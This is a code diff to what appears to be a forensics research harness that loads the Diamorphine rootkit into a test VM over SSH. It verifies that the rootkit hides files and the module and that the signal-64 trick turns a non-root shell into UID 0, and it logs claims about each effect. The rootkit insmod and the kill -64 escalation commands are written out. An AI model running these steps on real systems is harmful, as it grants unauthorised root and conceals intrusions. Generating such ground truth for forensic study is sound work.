@@ -6,11 +6,12 @@ from collections.abc import Callable
 from pathlib import Path
 
 import yaml
+from paramiko import SSHException
 
 from orchestrator.core import console
 from orchestrator.core.provenance import file_sha256
 from orchestrator.core.ssh_client import SSHClient
-from scenarios.command_log import record_operation, run_logged_command
+from scenarios.command_log import CommandLog, ScenarioClaim
 
 SCENARIO_ID = "kernel_lkm_diamorphine"
 ROOT = Path(__file__).resolve().parent
@@ -33,6 +34,84 @@ RECON_NOTE_NAME = "diamorphine_secret_file.txt"
 RECON_DIRECTORY = f"{RECON_PARENT}/{RECON_DIRECTORY_NAME}"
 RECON_NOTE = f"{RECON_DIRECTORY}/{RECON_NOTE_NAME}"
 MODULE_NAME = "diamorphine"
+
+
+def get_scenario_claims() -> list[ScenarioClaim]:
+    """Declare expected effects from successful scenario execution."""
+    return [
+        {
+            "id": "reconnaissance_note_created",
+            "statement": "A reconnaissance note was written and its directory and file were visible before module loading.",
+            "basis": [
+                "command_log.jsonl#write_recon_note",
+                "command_log.jsonl#list_parent_before",
+                "command_log.jsonl#list_directory_before",
+                "command_log.jsonl#validate_recon_note",
+            ],
+            "basis_type": "successful_commands",
+            "validation_limit": "The later scenario-defined access check does not establish content persistence throughout acquisition.",
+        },
+        {
+            "id": "module_loaded",
+            "statement": "insmod completed for the prepared Diamorphine module.",
+            "basis": [
+                "command_log.jsonl#load_module",
+                "inputs/diamorphine/diamorphine.ko",
+            ],
+            "basis_type": "successful_execution_and_scenario_fact",
+            "validation_limit": "Successful insmod does not independently establish every hook effect or continued residency at capture.",
+        },
+        {
+            "id": "directory_hidden",
+            "statement": "The reconnaissance directory disappeared from the tested parent listing after module loading.",
+            "basis": [
+                "command_log.jsonl#list_parent_after",
+                "command_log.jsonl#validate_hiding_and_direct_access",
+            ],
+            "basis_type": "successful_commands",
+            "validation_limit": "Limited to the tested directory listing.",
+        },
+        {
+            "id": "file_hidden",
+            "statement": "The reconnaissance file disappeared from the tested directory listing after module loading.",
+            "basis": [
+                "command_log.jsonl#list_directory_after",
+                "command_log.jsonl#validate_hiding_and_direct_access",
+            ],
+            "basis_type": "successful_commands",
+            "validation_limit": "Limited to the tested directory listing.",
+        },
+        {
+            "id": "hidden_note_accessible",
+            "statement": "Direct access to the hidden note returned its original contents.",
+            "basis": [
+                "command_log.jsonl#read_hidden_note",
+                "command_log.jsonl#validate_hiding_and_direct_access",
+            ],
+            "basis_type": "successful_commands",
+            "validation_limit": "The existing direct-access check is before acquisition and does not establish later availability.",
+        },
+        {
+            "id": "signal_64_privilege_change",
+            "statement": "The signal-64 helper changed from a non-root UID to UID 0.",
+            "basis": [
+                "command_log.jsonl#signal_64_helper",
+                "command_log.jsonl#validate_signal_64",
+            ],
+            "basis_type": "successful_commands",
+            "validation_limit": "The helper is short-lived; continued presence at RAM capture is not claimed.",
+        },
+        {
+            "id": "module_hidden",
+            "statement": "Diamorphine was absent from the tested lsmod output.",
+            "basis": [
+                "command_log.jsonl#list_modules",
+                "command_log.jsonl#validate_module_hidden",
+            ],
+            "basis_type": "successful_commands",
+            "validation_limit": "Absence from lsmod does not establish absence from other kernel views.",
+        },
+    ]
 
 
 def build_record_is_current(record: dict, source: dict) -> bool:
@@ -89,11 +168,12 @@ def run_diamorphine(
     """Preflight, load Diamorphine, and validate two bounded behaviors."""
     transcript_path.touch()
     terminal = ssh.open_terminal()
+    log = CommandLog(terminal, command_log_path)
     try:
         with terminal:
             console.scope("GUEST", "verify prepared module")
-            guest_kernel = run_logged_command(
-                terminal, command_log_path, "uname -r", timeout=180
+            guest_kernel = log.run(
+                "guest_kernel", "uname -r", timeout=180
             ).combined_output.strip()
             expected_kernel = build_record["target"]["kernel"]
             if guest_kernel != expected_kernel:
@@ -102,9 +182,10 @@ def run_diamorphine(
                     f"{expected_kernel}, guest kernel is {guest_kernel}"
                 )
 
-            modules_disabled = run_logged_command(
-                terminal, command_log_path, "cat /proc/sys/kernel/modules_disabled",
-                timeout=180
+            modules_disabled = log.run(
+                "module_loading_policy",
+                "cat /proc/sys/kernel/modules_disabled",
+                timeout=180,
             ).combined_output.strip()
             if modules_disabled != "0":
                 raise RuntimeError(
@@ -113,15 +194,14 @@ def run_diamorphine(
                 )
 
             console.scope("HOST", "stage Diamorphine module")
-            _upload_artifact(ssh, command_log_path, artifact_path)
+            _upload_artifact(ssh, log, artifact_path)
 
             console.scope("GUEST", "prepare hidden reconnaissance note")
-            run_logged_command(
-                terminal, command_log_path, f"mkdir -p -- {RECON_DIRECTORY}", timeout=180
+            log.run(
+                "create_recon_directory", f"mkdir -p -- {RECON_DIRECTORY}", timeout=180
             )
-            reconnaissance_note = run_logged_command(
-                terminal,
-                command_log_path,
+            reconnaissance_note = log.run(
+                "write_recon_note",
                 f"recon_hostname=$(uname -n) && recon_kernel=$(uname -r) && "
                 f"recon_identity=$(id) && "
                 f"printf 'hostname=%s\\nkernel=%s\\nidentity=%s\\n' "
@@ -130,33 +210,35 @@ def run_diamorphine(
                 timeout=180,
             ).combined_output.strip()
             if f"kernel={guest_kernel}" not in reconnaissance_note.splitlines():
-                raise RuntimeError("Reconnaissance note did not record the guest kernel")
-            parent_before = run_logged_command(
-                terminal, command_log_path, f"ls -1 -- {RECON_PARENT}", timeout=180
+                raise RuntimeError(
+                    "Reconnaissance note did not record the guest kernel"
+                )
+            parent_before = log.run(
+                "list_parent_before", f"ls -1 -- {RECON_PARENT}", timeout=180
             ).combined_output
-            directory_before = run_logged_command(
-                terminal, command_log_path, f"ls -1 -- {RECON_DIRECTORY}", timeout=180
+            directory_before = log.run(
+                "list_directory_before", f"ls -1 -- {RECON_DIRECTORY}", timeout=180
             ).combined_output
             if RECON_DIRECTORY_NAME not in parent_before:
                 raise RuntimeError(
                     "Reconnaissance directory was not visible before module load"
                 )
             if RECON_NOTE_NAME not in directory_before:
-                raise RuntimeError("Reconnaissance note was not visible before module load")
+                raise RuntimeError(
+                    "Reconnaissance note was not visible before module load"
+                )
+            log.note("validate_recon_note")
 
             console.scope("GUEST", "load and validate Diamorphine")
-            run_logged_command(
-                terminal, command_log_path, f"sudo -n insmod {VICTIM_ARTIFACT}", timeout=180
-            )
-            parent_after = run_logged_command(
-                terminal, command_log_path, f"ls -1 -- {RECON_PARENT}", timeout=180
+            log.run("load_module", f"sudo -n insmod {VICTIM_ARTIFACT}", timeout=180)
+            parent_after = log.run(
+                "list_parent_after", f"ls -1 -- {RECON_PARENT}", timeout=180
             ).combined_output
-            directory_after = run_logged_command(
-                terminal, command_log_path, f"ls -1 -- {RECON_DIRECTORY}", timeout=180
+            directory_after = log.run(
+                "list_directory_after", f"ls -1 -- {RECON_DIRECTORY}", timeout=180
             ).combined_output
-            direct_access = run_logged_command(
-                terminal,
-                command_log_path,
+            direct_access = log.run(
+                "read_hidden_note",
                 f"cat -- {RECON_NOTE}",
                 timeout=180,
             ).combined_output.strip()
@@ -165,63 +247,52 @@ def run_diamorphine(
                     "Reconnaissance directory remained visible after module load"
                 )
             if RECON_NOTE_NAME in directory_after:
-                raise RuntimeError("Reconnaissance note remained visible after module load")
+                raise RuntimeError(
+                    "Reconnaissance note remained visible after module load"
+                )
             if direct_access != reconnaissance_note:
-                raise RuntimeError("Direct access to the hidden reconnaissance note failed")
+                raise RuntimeError(
+                    "Direct access to the hidden reconnaissance note failed"
+                )
+            log.note("validate_hiding_and_direct_access")
 
-            helper_output = run_logged_command(
-                terminal,
-                command_log_path,
-                "bash -c 'printf \"pid=%s\\n\" \"$$\"; "
-                "printf \"before_uid=%s\\n\" \"$(id -u)\"; "
-                "printf \"before=%s\\n\" \"$(id)\"; "
-                "builtin kill -64 \"$$\"; "
-                "printf \"after_uid=%s\\n\" \"$(id -u)\"; "
-                "printf \"after=%s\\n\" \"$(id)\"'",
+            helper_output = log.run(
+                "signal_64_helper",
+                'bash -c \'printf "pid=%s\\n" "$$"; '
+                'printf "before_uid=%s\\n" "$(id -u)"; '
+                'printf "before=%s\\n" "$(id)"; '
+                'builtin kill -64 "$$"; '
+                'printf "after_uid=%s\\n" "$(id -u)"; '
+                'printf "after=%s\\n" "$(id)"\'',
                 timeout=180,
             ).combined_output
             helper = dict(
-                line.split("=", 1)
-                for line in helper_output.splitlines()
-                if "=" in line
+                line.split("=", 1) for line in helper_output.splitlines() if "=" in line
             )
             if not helper.get("pid", "").isdigit():
-                raise RuntimeError(f"Signal-64 helper PID was not captured: {helper_output!r}")
+                raise RuntimeError(
+                    f"Signal-64 helper PID was not captured: {helper_output!r}"
+                )
             if helper.get("before_uid") in (None, "0"):
                 raise RuntimeError("Signal-64 helper was not a non-root child")
             if helper.get("after_uid") != "0":
                 raise RuntimeError("Signal-64 calling child did not become UID 0")
+            log.note("validate_signal_64")
 
-            lsmod = run_logged_command(
-                terminal, command_log_path, "lsmod", timeout=180
-            ).combined_output
+            lsmod = log.run("list_modules", "lsmod", timeout=180).combined_output
             if any(
                 fields and fields[0] == MODULE_NAME
                 for fields in (line.split() for line in lsmod.splitlines())
             ):
                 raise RuntimeError("Diamorphine remained visible in lsmod")
+            log.note("validate_module_hidden")
     finally:
         transcript_path.write_text(terminal.transcript, encoding="utf-8")
 
     return {
-        "guest_kernel_release": guest_kernel,
-        "kernel_preflight_passed": True,
-        "module_loading_preflight_passed": True,
-        "reconnaissance_parent_path": RECON_PARENT,
-        "hidden_directory_path": RECON_DIRECTORY,
-        "hidden_file_path": RECON_NOTE,
-        "directory_hiding_validated": True,
-        "file_hiding_validated": True,
-        "direct_access_validated": True,
-        "reconnaissance_note_validated": True,
-        "module_hidden_at_scenario_completion": True,
         "signal_64_helper_pid": int(helper["pid"]),
         "signal_64_identity_before": helper["before"],
         "signal_64_identity_after": helper["after"],
-        "process_hiding_used": False,
-        "networking_used": False,
-        "backdoor_used": False,
-        "persistent_privilege_helper": False,
     }, lambda: None
 
 
@@ -251,13 +322,11 @@ def verify_source() -> dict:
     }
 
 
-def _upload_artifact(
-    ssh: SSHClient, command_log_path: Path, artifact_path: Path
-) -> None:
+def _upload_artifact(ssh: SSHClient, log: CommandLog, artifact_path: Path) -> None:
     console.step(f"Uploading {artifact_path.name} to {VICTIM_ARTIFACT}...")
     try:
         ssh.put(artifact_path, VICTIM_ARTIFACT)
-    except Exception as exc:
-        record_operation(command_log_path, "upload_artifact", error=str(exc))
+    except (OSError, RuntimeError, SSHException) as exc:
+        log.note("upload_artifact", error=str(exc))
         raise
-    record_operation(command_log_path, "upload_artifact")
+    log.note("upload_artifact")
